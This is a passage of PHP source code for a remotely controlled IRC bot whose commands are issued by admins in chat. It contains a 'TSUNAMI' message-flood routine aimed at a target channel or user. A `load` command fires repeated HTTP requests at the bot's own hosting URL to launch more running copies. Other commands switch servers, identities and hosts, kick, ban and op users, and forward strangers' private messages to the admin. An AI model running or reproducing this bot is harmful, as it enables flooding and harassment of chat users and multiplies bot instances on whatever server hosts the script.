                   fputs($fp, 'NOTICE '.$com[4].' :'.$msg.$tsumsg.CRL);
                   fputs($fp, 'PRIVMSG '.$com[4].' :TSUNAMI'.$msg.$tsumsg. CRL);
                   fputs($fp, 'NOTICE '.$com[4].' :'.$msg.$tsumsg.CRL);
                   fputs($fp, 'PART '.$com[4].' :F1n15h3d w1th 400x4 ch4rz' . CRL);
                   fputs($fp, 'NICK '.$nick . CRL);
                 }
                 else {
                   fputs($fp, 'NOTICE '.$com[4].' :'.$msg.$tsumsg.CRL);
                   fputs($fp, 'PRIVMSG '.$com[4].' :TSUNAMI'.$msg.$tsumsg. CRL);
                   fputs($fp, 'NOTICE '.$com[4].' :TSUNAMI'.$msg.$tsumsg. CRL);
                   fputs($fp, 'NOTICE '.$com[4].' :'.$msg.$tsumsg.CRL);
                   fputs($fp, 'NICK '.$nick . CRL);
                 }
               }
               elseif ($com[3]==':`cycle' && $chan && $auth["$dNick"]["status"]!="user") {
                 $msg = strstr($data,":`cycle");
                 if (ereg("#", $com[4])) {
                   $partchan = $com[4];
                   $msg = str_replace(":`cycle $com[4]","",$msg);
                 }
                 else {
                   $partchan = $chan;
                   $msg = str_replace(":`cycle","",$msg);
                 }
                 if (strlen($msg)<3) {
                   $msg = '';
                 }
                 fputs($fp, 'PART '.$partchan.' :'.$msg . CRL);
                 fputs($fp, 'JOIN '.$partchan . CRL);
               }
               elseif ($com[3]==':`part' && $auth["$dNick"]["status"]=="Admin") {
                 $msg = strstr($data,":`part");
                 if (ereg("#", $com[4])) {
                   $partchan = $com[4];
                   $msg = str_replace(":`part $com[4]","",$msg);
                 }
                 else {
                   $partchan = $chan;
                   $msg = str_replace(":`part","",$msg);
                 }
                 if (strlen($msg)<3) {
                   $msg = '';
                 }
                 fputs($fp, 'PART '.$partchan.' :'.$msg . CRL);
                 $remchan = strtolower($partchan);
                 if (in_array($remchan, $channel)) {
                   $channels = str_replace("$remchan ","",$channels);
                   unset($channel);
                   $channel = explode(" ", $channels);
                 }
                 foreach ($channel as $v) {
                   fputs($fp, 'JOIN '.$v . CRL);
                 }
               }
               elseif ($com[3]==':`join' && $com[4] && $auth["$dNick"]["status"]=="Admin") {
                 if (!ereg("#",$com[4])) { $com[4]="#".$com[4]; }
                 $addchan = strtolower($com[4]);
                 if (!in_array($addchan, $channel)) {
                   $channel[]=$addchan;
                   $channels.="$addchan ";
                 }
                 foreach ($channel as $v) {
                   sleep(rand(1,6));
                   fputs($fp, 'JOIN '.$v . CRL);
                 }
               }
               elseif ($com[3]==':`botnick' && $com[4] && !$chan && $auth["$dNick"]["status"]=="Admin") {
                 $nick = $com[4];
                 $identify = $com[5];
                 fputs($fp, 'NICK '.$nick . CRL);
                 fputs($fp, 'PRIVMSG nickserv :identify '.$nick.' '.$identify.  CRL);
               }
               elseif ($com[3]==':`k' && $com[4] && $chan) {
                 $msg = strstr($data,":`k");
                 $msg = str_replace(":`k $com[4]","",$msg);
                 fputs($fp, 'KICK '.$chan.' '.$com[4].' :'.$msg . CRL);
               }
               elseif ($com[3]==':`kb' && $com[4] && $chan) {
                 $msg = strstr($data,":`kb");
                 $msg = str_replace(":`kb $com[4]","",$msg);
                 fputs($fp, 'KICK '.$chan.' '.$com[4].' :'.$msg . CRL);
                 fputs($fp, 'MODE '.$chan.' +b '.$com[4] . CRL);
               }
               elseif ($com[3]==':`changenick') {
                 $nick = $nicky[rand(0,count($nicky) - 1)];
                 fputs($fp, 'NICK '.$nick . CRL);
                 if (substr($dCommand,0,3)=='433') {
                   $nick = $nicky[rand(0,count($nicky) - 1)];
                   fputs($fp, 'NICK '.$nick . CRL);
                 }
               }
               elseif ($com[3]==':`op' && $chan) {
                 if ($com[4]) { $opnick = $com[4]; }
                 else { $opnick = $dNick; }
                 fputs($fp, 'MODE '.$chan.' +ooo '.$opnick.' '.$com[5].' '.$com[6] . CRL);
               }
               elseif ($com[3]==':`deop' && $chan) {
                 if ($com[4]) { $opnick = $com[4]; }
                 else { $opnick = $dNick; }
                 fputs($fp, 'MODE '.$chan.' -o+v-oo '.$opnick.' '.$opnick.' '.$com[5].' '.$com[6] . CRL);
               }
               elseif ($com[3]==':`v' && $chan) {
                 if ($com[4]) { $vonick = $com[4]; }
                 else { $vonick = $dNick; }
                 fputs($fp, 'MODE '.$chan.' +vvv '.$vonick.' '.$com[5].' '.$com[6] . CRL);
               }
               elseif ($com[3]==':`dv' && $chan) {
                 if ($com[4]) { $vonick = $com[4]; }
                 else { $vonick = $dNick; }
                 fputs($fp, 'MODE '.$chan.' -vvv '.$vonick.' '.$com[5].' '.$com[6] . CRL);
               }
               elseif ($com[3]==':`awaymsg' && $auth["$dNick"]["status"]=="Admin") {
                 $msg = strstr($data,":`awaymsg");
                 $msg = str_replace(":`awaymsg","",$msg);
                 if (strlen($msg)<3) {
                   $raway="on";
                   fputs($fp,'AWAY : ' . 'AWAY' . CRL);
                 }
                 else {
                   $raway="off";
                   fputs($fp,'AWAY : ' . $msg . CRL);
                 }
               }
               elseif ($com[3]==':`mode' && $com[4] && $chan) {
                 fputs($fp, 'MODE '.$chan.' :'.$com[4].' '.$com[5] . CRL);
               }
               elseif ($com[3]==':`nickmode' && $com[4]) {
                 $nickmode = $com[4];
                 fputs($fp, 'MODE '.$nick.' :'.$nickmode . CRL);
               }
               elseif ($com[3]==':`chanlist') {
                 fputs($fp, 'NOTICE '.$dNick.' :Channel List: '.$channels . CRL);
               }
               elseif ($com[3]==':`userlist') {
                 $userlist="";
                 foreach ($auth as $user) {
                   if ($user["pass"]) { $pass="-pass ok"; }
                   else { $pass="-no pass"; }
                   $userlist .= $user["name"].'('.$user["status"].$pass.') ';
                 }
                 fputs($fp, 'NOTICE '.$dNick.' :User List: '.$userlist . CRL);
               }
               elseif ($com[3]==':`quit' && $auth["$dNick"]["status"]=="Admin") {
                 $msg = strstr($data,":`quit");
                 $msg = str_replace(":`quit","",$msg);
                 if (strlen($msg)>3) {
                   $msg = str_replace(" ","_",$msg);
                 }
                 $quitmsg = $quitmsglist[rand(0,count($quitmsglist) - 1)];
                 fputs($fp, 'QUIT ' . $quitmsg . CRL);
                 $keluar = 1;
                 exit;
               }
               elseif ($com[3]==':`vhost' && $auth["$dNick"]["status"]=="Admin") {
                 if ($com[4]) { $localhost = $com[4]; }
                 else { $localhost = 'localhost'; }
                 $keluar = 0;
                 fputs($fp, 'QUIT Ganti VHOST' . CRL);
               }
               elseif ($com[3]==':`jump' && $auth["$dNick"]["status"]=="Admin") {
                 if (empty($com[4])) {
                   $remotehost = $remotehost2[rand(0,count($remotehost2) - 1)];
                 }
                 else { $remotehost = $com[4]; }
                 $keluar = 0;
                 fputs($fp, "QUIT Ganti Server".CRL);
               }
               elseif ($com[3]==':`ident' && $auth["$dNick"]["status"]=="Admin") {
                 if (!$com[4]) { $username = $username; }
                 else { $username = $com[4]; }
                 $keluar = 0;
                 fputs($fp, 'QUIT Ganti Ident ' . CRL);
               }
               elseif ($com[3]==':`fullname' && $auth["$dNick"]["status"]=="Admin") {
                 if (!$com[4]) { $realname = "--"; }
                 else { $realname = $com[4]; }
                 $keluar = 0;
                 fputs($fp, 'QUIT Ganti Nama' . CRL);
               }
               elseif ($com[3]==':`topic' && $com[4] && $chan) {
                 $msg = strstr($data,":`topic");
                 $msg = str_replace(":`topic ","",$msg);
                 fputs($fp, 'TOPIC '.$chan.' :'.$msg . CRL);
               }
               elseif ($com[3]==':`load') {
                 if ($auth["$dNick"]["status"]=="Admin") {
                   $bhost = $_SERVER['HTTP_HOST'];
                   $bruri = $_SERVER['REQUEST_URI'];
                   if ($com[4]) { $jmlbot = $com[4]; }
                   else { $jmlbot = 1; }
                   for ($i=1;$i<=$com[4];$i++) {
                     $soket = fsockopen($bhost,80,$errno,$errstr,10);
                     fputs($soket,"GET $bruri HTTP/1.0\r\nHost: $bhost\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n");
                     fclose($soket);
                   }
                   fputs($fp,"NOTICE $dNick :".$com[4]." Bot(s) loaded!".CRL);
                 }
               }
               elseif ($com[3]==':!help' && !$chan) {
                 fputs($fp,'PRIVMSG '.$dNick.' :No Help!' . CRL);
               }
             }
           }
         }
         elseif (!$auth["$dNick"] && !eregi("auth",$iText)) {
           if (eregi("www.",$iText) || eregi("http:",$iText) || eregi("join #",$iText)) {
             if (!ereg("#",$dCommand)) {
               if ($log=="on") {
                 fputs($fp,'PRIVMSG '. $admin .' :4inviter: ' . $dFrom . '2:' .$iText. CRL);
               }
               $inv = strstr($dFrom,'@');
               foreach ($auth as $user) {
                 if ($user["status"]=="user") {
                   fputs($fp, 'NOTICE '.$user["name"].' :KB '.$chan.' '.$dNick.' '.$inv.'' . CRL);
                 }
               }
             }
           }
           elseif (!ereg("#",$dCommand)) {
             if ($log=="on") {
               fputs($fp,'PRIVMSG '.$admin.' :6' . $dFrom . '12:' .$iText. CRL);
             }
           }
         }
       }
     }
     elseif (substr($data,0,4) == 'PING') {
       fputs($fp,'PONG ' . substr($data,5) . CRL);
     }
   }
 }
 fclose($fp);
} while ($keluar == 0);
}

rx();

?>